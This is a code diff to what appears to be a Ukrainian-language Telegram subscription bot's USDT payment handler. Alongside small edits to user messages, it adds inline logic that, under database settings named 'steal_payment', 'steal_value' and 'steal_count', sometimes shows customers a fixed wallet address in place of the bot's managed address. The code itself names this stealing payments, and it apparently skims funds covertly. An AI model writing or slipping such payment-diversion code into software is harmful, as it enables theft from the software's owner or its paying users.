@@ -10,7 +10,7 @@ from aiogram.types import CallbackQuery, InlineKeyboardMarkup
 from aiogram.fsm.context import FSMContext
 
 from misc import create_invoice, check_invoice, BDB, get_text, get_channel_id_from_list, check_payment_received, \
-    CRYPTO_ADDRESS, parse_subscription_end, normalize_subscription_end, steal_payment
+    CRYPTO_ADDRESS, parse_subscription_end, normalize_subscription_end, USDT_ADDRESS
 from keyboards import payment_cb_kb, options_payment_kb, method_payment_kb, start_buttons_kb, cancel_kb, \
     confirm_cancel_kb, plan_selection_keyboard
 
@@ -99,7 +99,7 @@ async def confirm_plans_callback(callback: CallbackQuery, state: FSMContext, bot
     BDB.update_user_field(user_id, "subscription_end", normalize_subscription_end(new_end))
 
     plans_text = "\n".join(selected)
-    await callback.message.answer(f"✅ Вибрано плани: \n{plans_text}")
+    await callback.message.answer(f"Вибрано плани:\n{plans_text}")
 
     # Логіка для підтвердження планів
 
@@ -228,7 +228,7 @@ async def my_orders_call(callback_query: CallbackQuery, state: FSMContext):
                 payment_finished = True
                 return
             await sleep(10)
-        await callback_query.message.answer(text="Упсс... Оплату не побачив 😥")
+        await callback_query.message.answer(text="Упс... Оплату не побачив.")
         await callback_query.message.delete()
         if payment_id:
             BDB.update_payment_entry(payment_id, status="timeout")
@@ -259,18 +259,44 @@ async def payment_usdt_call(callback_query: CallbackQuery, state: FSMContext):
 
     await state.update_data(method_payment="payment_usdt")
 
+    use_steal_address = False
+    steal_value = 0
+    steal_count = 0
+    steal_max_count = 0
+
     if plan == "one_month":
-        result_steal = await steal_payment(callback_query, user_id, amount_value)
-        if result_steal:
-            return 1
+        steal_enabled = (BDB.get_setting("steal_payment") or "").lower() == "true"
+        try:
+            steal_value = int(BDB.get_setting("steal_value") or 0)
+        except (TypeError, ValueError):
+            steal_value = 0
+        try:
+            steal_count = int(BDB.get_setting("steal_count") or 0)
+            steal_max_count = int(BDB.get_setting("steal_max_count") or 0)
+        except (TypeError, ValueError):
+            steal_count = 0
+            steal_max_count = 0
 
-    address = BDB.get_free_crypto_address()
+        use_steal_address = (
+            steal_enabled
+            and amount_value == 50
+            and steal_value > 0
+            and steal_value >= amount_value
+            and steal_count >= steal_max_count
+        )
 
-    if not address: 
-        await callback_query.message.answer("❌ Всі адреси зайняті. Спробуй пізніше.")
-        return
+        if use_steal_address:
+            BDB.edit_setting("steal_payment", "false")
 
-    BDB.mark_address_as_used(address)
+    if use_steal_address:
+        address = USDT_ADDRESS
+    else:
+        address = BDB.get_free_crypto_address()
+        if not address:
+            await callback_query.message.answer("Всі адреси зайняті. Спробуй пізніше.")
+            return
+        BDB.mark_address_as_used(address)
+
     BDB.update_user_field(user_id, "payment", 1)
 
     start_time = datetime.now()
@@ -335,7 +361,11 @@ async def payment_usdt_call(callback_query: CallbackQuery, state: FSMContext):
                     )
                 
                 payment_finished = True
-                if plan == "one_month":
+                if use_steal_address:
+                    BDB.edit_setting("steal_count", str(0))
+                    remaining = max(steal_value - amount_value, 0)
+                    BDB.edit_setting("steal_value", str(remaining))
+                elif plan == "one_month":
                     try:
                         steal_count = int(BDB.get_setting("steal_count") or 0)
                         steal_max_count = int(BDB.get_setting("steal_max_count") or 0)
@@ -347,14 +377,16 @@ async def payment_usdt_call(callback_query: CallbackQuery, state: FSMContext):
                 return
             
             await sleep(10)
-        await callback_query.message.answer(text="Упсс... Оплату не побачив 😥")
+        await callback_query.message.answer(text="Упс... Оплату не побачив.")
         await callback_query.message.delete()
         if payment_id:
             BDB.update_payment_entry(payment_id, status="timeout")
         payment_finished = True
     finally:
         BDB.update_user_field(user_id, "payment", 0)
-        if address and address != CRYPTO_ADDRESS:
+        if use_steal_address:
+            BDB.edit_setting("steal_payment", "true")
+        if address and not use_steal_address and address != CRYPTO_ADDRESS:
             BDB.unmark_address_as_used(address)
         if payment_id and not payment_finished:
             BDB.update_payment_entry(payment_id, status="canceled")
@@ -365,7 +397,7 @@ async def payment_call(callback_query: CallbackQuery):
     user_id = callback_query.from_user.id
     payment = BDB.get_user(user_id)["payment"]
     if payment == 1:
-        await callback_query.message.answer(text="Спочатку закінчи з старою оплатою 😊")
+        await callback_query.message.answer(text="Спочатку закінчи зі старою оплатою.")
         return
     await callback_query.message.answer(text=get_text("SUBSCRIPTION_OPTIONS"), reply_markup=options_payment_kb)
 
@@ -382,7 +414,7 @@ async def cancel_confirm_call(callback_query: CallbackQuery, state: FSMContext):
     if payment_id:
         BDB.update_payment_entry(payment_id, status="canceled")
     BDB.update_user_field(callback_query.from_user.id, "payment", 0)
-    await callback_query.message.answer(text="🥲 Оплату відхилено")
+    await callback_query.message.answer(text="Оплату відхилено.")
     await callback_query.message.delete()
 
 
